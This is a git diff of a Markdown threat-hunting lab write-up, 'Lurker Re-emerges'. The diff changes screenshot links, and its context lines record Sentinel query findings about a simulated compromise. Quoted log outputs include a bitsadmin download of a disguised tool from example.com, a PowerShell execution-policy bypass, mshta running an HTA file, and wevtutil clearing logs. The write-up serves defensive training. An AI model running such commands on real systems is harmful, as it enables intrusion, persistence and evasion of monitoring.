@@ -1,5 +1,6 @@
 # 🥷🏿 Lurker Re-emerges
-<img width="1024" height="1024" alt="Lurker Main Pic" src="https://github.com/user-attachments/assets/59a1e2ea-4c3b-4d0b-a750-b8bf0a5d7d56" />
+<img width="1024" height="1024" alt="Lurker Main Pic" src="https://github.com/user-attachments/assets/b82e645e-68ef-4c40-b1ba-8230f71fad57" />
+
 
 ## 📏 Perimeters
 Date Completed: ***2025-07-13***  
@@ -159,7 +160,8 @@ DeviceFileEvents
 ```
 **Output:** `michaelvm`  
 **Finding:** By querying the “DeviceName” in `Sentinel` with a sorted list by “`FileCreated`” count in ascending order, a manageable list of 85 entries got siphoned out. The output “`michaelvm`” identifies the first VM compromised, marking the beginning of the threat hunting process.
-<img width="1027" height="672" alt="Pasted Graphic" src="https://github.com/user-attachments/assets/4e7f7bf2-babe-4c50-8125-7cc1df710337" />
+<img width="1027" height="672" alt="Pasted Graphic" src="https://github.com/user-attachments/assets/0ec38c88-8195-48ff-845c-7adc25edc08f" />
+
 
 ---
 
@@ -181,7 +183,8 @@ DeviceProcessEvents
 ```
 **Output:** `"powershell.exe" -ExecutionPolicy Bypass -File "C:\Users\Mich34L_id\CorporateSim\Investments\Crypto\wallet_gen_0.ps1"`  
 **Finding:** Suspicious account “mich34l_id” executed the first .ps1 file, indicating the initial compromise.
-<img width="819" height="666" alt="Pasted Graphic 1" src="https://github.com/user-attachments/assets/c0ecab1b-a633-41d9-85c2-e71f60f7851b" />
+<img width="819" height="666" alt="Pasted Graphic 1" src="https://github.com/user-attachments/assets/00cdd4cf-09a7-4cb3-b050-13d834936242" />
+
 
 ---
 
@@ -203,7 +206,8 @@ DeviceProcessEvents
 ```
 **Output:** `badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0`  
 **Finding:** The SHA256 hash identifies the initial reconnaissance binary tied to the attacker’s entry.
-<img width="1069" height="171" alt="Pasted Graphic 4" src="https://github.com/user-attachments/assets/7185e349-1963-4ba5-811a-3b45a8ec98ad" />
+<img width="1069" height="171" alt="Pasted Graphic 4" src="https://github.com/user-attachments/assets/b2f0b6bd-8191-4b94-be7f-857cba24e3dd" />
+
 
 ---
 
@@ -245,7 +249,8 @@ DeviceEvents
 ```
 **Output:** `2025-06-16T06:12:28.2856483Z`  
 **Finding:** The last access to “QuarterlyCryptoHoldings.docx” occurred at the specified timestamp, indicating pre-exfiltration activity.
-<img width="1029" height="229" alt="Pasted Graphic 6" src="https://github.com/user-attachments/assets/511a6a10-075b-46ec-b940-311fdd51ed8c" />
+<img width="1029" height="229" alt="Pasted Graphic 6" src="https://github.com/user-attachments/assets/ea93b006-5417-470c-8e2d-74e6d4351807" />
+
 
 ---
 
@@ -265,7 +270,8 @@ DeviceProcessEvents
 ```
 **Output:** `"bitsadmin.exe" /transfer job1 https://example.com/crypto_toolkit.exe C:\Users\MICH34~1\AppData\Local\Temp\market_sync.exe`  
 **Finding:** The command shows `bitsadmin.exe` downloading a malicious file, confirming stealth tool deployment.
-<img width="1593" height="146" alt="465682981-90c04309-ae3c-4937-a477-50bd1f00f80f" src="https://github.com/user-attachments/assets/3d749896-7f5b-4ae3-bce4-a556487af525" />
+<img width="1593" height="146" alt="465682981-90c04309-ae3c-4937-a477-50bd1f00f80f" src="https://github.com/user-attachments/assets/4847cb05-4443-4973-ad1d-71e27a1a2133" />
+
 
 ---
 
@@ -287,7 +293,8 @@ DeviceFileEvents
 ```
 **Output:** `ledger_viewer.exe`  
 **Finding:** The executable “ledger_viewer.exe” in the Temp folder suggests a staged malicious payload.
-<img width="1177" height="90" alt="465683004-9e786a76-ae6e-4b73-b779-2b85d688c6c0" src="https://github.com/user-attachments/assets/287d8a23-b8ad-4658-8d90-0d353eca1bee" />
+<img width="1593" height="146" alt="465682981-90c04309-ae3c-4937-a477-50bd1f00f80f" src="https://github.com/user-attachments/assets/346ce442-5e17-43c1-95c9-99a1e410b1a3" />
+
 
 ---
 
@@ -308,7 +315,8 @@ DeviceProcessEvents
 ```
 **Output:** `"mshta.exe" C:\Users\MICH34~1\AppData\Local\Temp\client_update.hta`  
 **Finding:** The command reveals `mshta.exe` executing a suspicious HTA file, indicating social engineering tactics.
-<img width="894" height="137" alt="465683033-69183010-6fa7-4e38-b64d-3829538e7775" src="https://github.com/user-attachments/assets/a01daa27-2cc4-4a72-950e-56ba7a1412bd" />
+<img width="894" height="137" alt="465683033-69183010-6fa7-4e38-b64d-3829538e7775" src="https://github.com/user-attachments/assets/42e40c80-3d3a-4431-a9d3-a7cdff43ca50" />
+
 
 ---
 
@@ -329,7 +337,8 @@ DeviceProcessEvents
 ```
 **Output:** `801262e122db6a2e758962896f260b55bbd0136a`  
 **Finding:** The SHA1 hash confirms a DLL hidden in ADS, indicating a stealthy payload execution attempt.
-<img width="612" height="261" alt="Timestamp" src="https://github.com/user-attachments/assets/e9dc0be3-8b60-49ca-b208-23175d75e13d" />
+<img width="612" height="261" alt="Timestamp" src="https://github.com/user-attachments/assets/37b38ad5-503c-4a1b-8a60-021ae32dcdb1" />
+
 
 ---
 
@@ -350,7 +359,8 @@ DeviceRegistryEvents
 ```
 **Output:** `HKEY_CURRENT_USER\S-1-5-21-2654874317-2279753822-948688439-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`  
 **Finding:** The registry key confirms persistence via autorun, ensuring the attack script re-executes.
-<img width="1068" height="234" alt="465683221-12237500-7e73-4d93-b88d-513fd7ee17d8" src="https://github.com/user-attachments/assets/e6f77cc9-8fed-49b2-bcc8-05a4948b032b" />
+<img width="1068" height="234" alt="465683221-12237500-7e73-4d93-b88d-513fd7ee17d8" src="https://github.com/user-attachments/assets/d146dc79-1fd8-4bb3-890a-45391a91bfac" />
+
 
 ---
 
@@ -371,7 +381,8 @@ DeviceProcessEvents
 ```
 **Output:** `MarketHarvestJob`  
 **Finding:** The task “MarketHarvestJob” indicates a scheduled task created for persistent payload execution.
-<img width="1655" height="525" alt="465683264-a70760a0-4f63-4155-9cd0-2762cd92e1d4" src="https://github.com/user-attachments/assets/124c3505-35fb-40e4-8876-8c838b8778e1" />
+<img width="1655" height="525" alt="465683264-a70760a0-4f63-4155-9cd0-2762cd92e1d4" src="https://github.com/user-attachments/assets/e5e2121d-456b-45f6-beff-504db9332a61" />
+
 
 ---
 
@@ -392,7 +403,8 @@ DeviceProcessEvents
 ```
 **Output:** `centralsrvr`  
 **Finding:** The command reveals “centralsrvr” as the next machine targeted via remote scheduled tasks.
-<img width="1435" height="783" alt="465683300-f7b74394-73f6-4bc8-901a-ec64b1338d88" src="https://github.com/user-attachments/assets/ff0b79b7-0322-4883-b04f-eebc4d89a8d6" />
+<img width="1435" height="783" alt="465683300-f7b74394-73f6-4bc8-901a-ec64b1338d88" src="https://github.com/user-attachments/assets/4e273ea7-3a94-4e7c-9e1b-6aaf8c600cb8" />
+
 
 ---
 
@@ -413,7 +425,8 @@ DeviceProcessEvents
 ```
 **Output:** `2025-06-17T03:00:49.525038Z`  
 **Finding:** The timestamp marks the last lateral execution to “centralsrvr,” defining the attack’s progression.
-<img width="1418" height="231" alt="465683321-89e63654-2a16-405b-b9e6-aa92af7cdd04" src="https://github.com/user-attachments/assets/e5cc45a7-fbbe-4a08-9d9b-f3a6a44f85c2" />
+<img width="1418" height="231" alt="465683321-89e63654-2a16-405b-b9e6-aa92af7cdd04" src="https://github.com/user-attachments/assets/5e945ed0-af1b-424b-a0e7-fe11d7fa449d" />
+
 
 ---
 
@@ -434,7 +447,8 @@ DeviceFileEvents
 ```
 **Output:** `b4f3a56312dd19064ca89756d96c6e47ca94ce021e36f818224e221754129e98`  
 **Finding:** The SHA256 hash confirms access to “QuarterlyCryptoHoldings.docx” on “centralsrvr,” indicating targeted data theft.
-<img width="788" height="196" alt="465683369-0930c33e-4992-4961-beeb-75ce06098167" src="https://github.com/user-attachments/assets/a9a36cdb-a1be-491a-9e59-78ce92eab3be" />
+<img width="788" height="196" alt="465683369-0930c33e-4992-4961-beeb-75ce06098167" src="https://github.com/user-attachments/assets/47e3008b-9bd6-413d-94f3-871a0943f207" />
+
 
 ---
 
@@ -454,7 +468,8 @@ DeviceNetworkEvents
 ```
 **Output:** `2e5a8590cf6848968fc23de3fa1e25f1`  
 **Finding:** The MD5 hash identifies the process responsible for exfiltration, confirming data theft.
-<img width="1193" height="136" alt="465683429-940171b9-78e2-448f-bf9c-e3a0d102d5da" src="https://github.com/user-attachments/assets/c7f6bc63-fd92-40ec-aefb-d63f7dd07e66" />
+<img width="1193" height="136" alt="465683429-940171b9-78e2-448f-bf9c-e3a0d102d5da" src="https://github.com/user-attachments/assets/5e4025bc-a0ed-4cfe-83dd-b4fc9bbed7d5" />
+
 
 ---
 
@@ -475,7 +490,8 @@ DeviceNetworkEvents
 ```
 **Output:** `104.22.69.199`  
 **Finding:** The IP address corresponds to “pastebin.com,” the last suspicious destination for exfiltrated data.
-<img width="1193" height="136" alt="465683461-83abad89-3ceb-4cfa-b560-d96b8584436c" src="https://github.com/user-attachments/assets/f8f57de1-b647-410f-82ff-e91c67a64987" />
+<img width="1193" height="136" alt="465683461-83abad89-3ceb-4cfa-b560-d96b8584436c" src="https://github.com/user-attachments/assets/926c8b0e-a2c3-49e5-a171-e07df971606b" />
+
 
 ---
 
@@ -496,7 +512,8 @@ DeviceProcessEvents
 ```
 **Output:** `2025-06-18T10:52:59.0847063Z`  
 **Finding:** The timestamp indicates a PowerShell downgrade attempt, confirming evasion of logging mechanisms.
-<img width="700" height="138" alt="Timestamp" src="https://github.com/user-attachments/assets/c56d2002-4a1b-476d-833f-93ac6d888fcd" />
+<img width="700" height="138" alt="Timestamp" src="https://github.com/user-attachments/assets/0d9db76c-dc35-4faf-baa1-51ec6c30388a" />
+
 
 ---
 
@@ -517,10 +534,12 @@ DeviceProcessEvents
 ```
 **Output:** `2025-06-18T10:52:33.3030998Z`  
 **Finding:** The timestamp confirms the use of `wevtutil` to clear security logs, indicating an attempt to cover tracks.
-<img width="436" height="195" alt="Timestamp" src="https://github.com/user-attachments/assets/3113d74c-f97c-4885-a61b-cd8658cbc9db" />
+<img width="436" height="195" alt="Timestamp" src="https://github.com/user-attachments/assets/db77da44-a80b-4041-80a5-3917de2dbd90" />
+
 
 ---
 
 # FINISHED!! YAY~
-<img width="406" height="381" alt="V2hhdCBZb3U=" src="https://github.com/user-attachments/assets/8308edc2-5091-4636-87f9-8d238c3bcf93" />
+<img width="406" height="381" alt="V2hhdCBZb3U=" src="https://github.com/user-attachments/assets/1c80e104-fe8a-42f6-aa4c-d5a4948b0a33" />
+
 
